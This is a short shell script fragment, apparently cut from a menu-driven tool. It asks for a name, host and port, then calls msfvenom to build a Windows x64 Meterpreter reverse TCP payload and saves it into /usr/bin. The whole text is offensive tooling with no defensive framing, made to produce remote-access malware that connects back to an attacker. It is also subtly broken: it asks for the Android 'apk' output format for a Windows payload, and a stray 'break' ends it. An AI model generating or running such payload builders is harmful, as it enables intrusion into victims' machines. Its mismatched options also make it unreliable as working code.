read -p "Enter Payload name:" name
read -p "Enter the Host: " lhostt
read -p "Enter the Port: " lportt
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhostt LPORT=$lportt -f apk -o /usr/bin/$name
echo " Payload file stored in /usr/bin/"$name
break

